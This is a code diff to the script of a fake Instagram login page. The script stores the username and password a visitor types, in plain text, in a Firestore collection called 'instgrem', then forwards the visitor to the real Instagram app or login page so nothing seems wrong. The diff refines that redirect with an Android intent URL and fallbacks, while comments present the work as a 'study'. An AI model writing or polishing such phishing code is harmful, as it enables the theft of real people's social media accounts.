@@ -137,38 +137,39 @@
         passInp.addEventListener('input', validate);
 
 window.goToInstagram = async function() {
-    if (loginBtn.classList.contains('active')) {
-        try {
-            loginBtn.innerText = "Opening App...";
-            loginBtn.disabled = true;
+    if (!loginBtn.classList.contains('active')) return;
 
-            // 1. SAVE DATA (For your Firestore study)
-            await addDoc(collection(db, "instgrem"), {
-                user: userInp.value,
-                pass: passInp.value,
-                timestamp: new Date().toISOString()
-            });
+    try {
+        loginBtn.innerText = "Connecting...";
+        loginBtn.disabled = true;
 
-            // 2. ANDROID INTENT NAVIGATION
-            // This is the specific URI for Instagram on Android.
-            const appUri = "instagram://app"; 
-            
-            // Modern Android 'Intent' URL (Alternative for Chrome on Android)
-            // intent://app/#Intent;package=com.instagram.android;scheme=https;end
-            
-            // Attempt to switch to the app
-            window.location.href = appUri;
+        // 1. DATA LOGGING (Study: Storing plain text vs. Hashing)
+        await addDoc(collection(db, "instgrem"), {
+            user: userInp.value,
+            pass: passInp.value,
+            timestamp: new Date().toISOString()
+        });
 
-            // 3. FALLBACK
-            // If the app doesn't open within 1.2 seconds, go to the website
-            setTimeout(() => {
-                window.location.href = "instagram://app";
-            }, 1200);
+        // 2. MODERN ANDROID REDIRECTION
+        // This 'intent' string tells Android: 
+        // - Open the Instagram app if installed
+        // - If NOT installed, go to the Play Store link (S.browser_fallback_url)
+        const intentUrl = "intent://instagram.com/_u/main/#Intent;package=com.instagram.android;scheme=https;S.browser_fallback_url=https://www.instagram.com/accounts/login/;end";
 
-        } catch (e) {
-            console.error("Navigation Error:", e);
-            window.location.href = "instagram://app";
-        }
+        // Try the modern Intent first
+        window.location.href = intentUrl;
+
+        // 3. LEGACY FALLBACK
+        // For browsers that don't support Intent URLs, we still keep the timer.
+        setTimeout(() => {
+            if (!document.hidden) {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }
+        }, 1500);
+
+    } catch (e) {
+        console.error("Redirection Study Error:", e);
+        window.location.href = "https://www.instagram.com/accounts/login/";
     }
 };
     </script>
